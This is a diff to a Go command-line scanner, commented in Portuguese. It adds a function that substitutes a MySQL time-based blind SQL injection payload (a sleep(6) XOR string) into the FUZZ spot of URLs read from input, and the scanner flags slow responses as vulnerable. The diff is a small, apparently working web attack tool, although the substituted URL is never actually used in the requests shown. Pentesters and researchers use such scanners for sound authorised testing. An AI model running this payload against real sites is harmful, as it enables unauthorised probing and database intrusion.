@@ -28,10 +28,17 @@ func medirTempoRequisicao(url string) float64 {
 	return tempoTotal
 }
 
+func replaceFuzz(urlString string) string {
+	// Substitui todas as ocorrências de "FUZZ" pela string desejada
+	replaced := strings.ReplaceAll(urlString, "FUZZ", "0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z")
+	return replaced
+}
+
 func testarURLs(tempoSQLi float64) {
 	scanner := bufio.NewScanner(os.Stdin)
 	for scanner.Scan() {
 		url := scanner.Text()
+		replacedURL := replaceFuzz(url)
 		url = url // Remover espaços em branco e quebras de linha
 		if medirTempoRequisicao(url) >= tempoSQLi && medirTempoRequisicao(url) <= (tempoSQLi*3)+1 {
 			fmt.Printf("%sVulnerable: %s%s - {%f}\n", red, url, reset, medirTempoRequisicao(url))
